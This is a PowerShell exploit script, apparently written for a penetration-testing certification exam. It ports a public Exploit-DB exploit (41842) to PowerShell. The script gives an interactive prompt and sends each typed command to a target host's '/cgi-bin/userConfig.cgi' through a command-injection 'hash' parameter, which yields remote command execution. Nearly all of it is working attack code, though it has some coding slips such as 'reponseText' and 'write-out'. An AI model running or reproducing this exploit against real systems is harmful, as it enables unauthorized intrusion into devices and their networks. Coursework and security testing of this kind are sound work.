#https://www.exploit-db.com/exploits/41842
#Part of the code is taken from Nishang 


<#
.SYNOPSIS
This powershell script is ported to take advantage of the following exploit https://www.exploit-db.com/exploits/41842.

.DESCRIPTION
This powershell script is ported to take advantage of the following exploit https://www.exploit-db.com/exploits/41842.


.EXAMPLE
PS C:\> . '.\5TH Assignment 1st Exploit.ps1' somedomaingoinginfectedwiththisvuln.com

.LINK
https://www.exploit-db.com/exploits/41842
Part of the code is taken from Nishang 


.Note 
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3259



#>

[cmdletBinding()]

    param (
    [Parameter(Mandatory = $True , valuefrompipeline = $True)] $Targeturl
   
        
    )


    
 
 $cmd = ""

 while($cmd -ne "exit")
 {
     Write-Output "CommandInjectionExploit> "
     $cmd = read-host
     function post_http ($Targeturl, $parameters)
    {
       $FullURLrequest =  "https://" + $Targeturl + "/cgi-bin/userConfig.cgi?func=cloudPersonalSmtp&sid=SIDVALUE&hash=`(echo;" + $cmd + ';uname%20-a)>%262`'
       Write-Output $FullURLrequest
       Write-Output "Running the following command: $cmd" 
        $http_request = Invoke-WebRequest -Uri $FullURLrequest 

        $session = $http_request.reponseText
        write-out "Command Respnose $session"

    }

        post_http $Targeturl

    }

  